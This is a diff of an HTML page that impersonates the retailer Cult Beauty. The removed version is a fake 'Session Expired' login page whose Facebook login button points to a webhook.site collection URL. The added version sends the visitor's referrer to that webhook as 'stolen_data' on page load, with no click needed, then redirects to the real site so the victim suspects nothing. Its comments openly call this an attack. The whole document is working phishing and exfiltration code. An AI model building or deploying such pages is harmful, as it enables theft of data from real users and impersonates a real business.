@@ -1,11 +1,21 @@
 <!DOCTYPE html>
 <html>
-<body style="text-align:center; margin-top:100px;">
-    <h2>Cult Beauty - Session Expired</h2>
-    <p>Please click below to re-authenticate your account.</p>
-    <a href="https://webhook.site/f0caaa7e-adb1-4d0f-bacb-a2bdf359ea28" 
-       style="background:#1877F2; color:white; padding:10px 20px; text-decoration:none; border-radius:5px;">
-       Login with Facebook
-    </a>
+<head>
+    <title>Checking Security...</title>
+</head>
+<body>
+    <script>
+        // Professional Attack: Jaise hi page load ho, data webhook par bhej do
+        // User ko kuch click karne ki zaroorat nahi
+        fetch("https://webhook.site/f0caaa7e-adb1-4d0f-bacb-a2bdf359ea28?stolen_data=" + btoa(document.referrer), {
+            mode: 'no-cors'
+        });
+
+        // Phir user ko wapas asli site par bhej do taake usay shak na ho
+        setTimeout(function(){
+            window.location.href = "https://www.cultbeauty.co.uk/";
+        }, 1500);
+    </script>
+    <h2>Connecting to Secure Server...</h2>
 </body>
 </html>
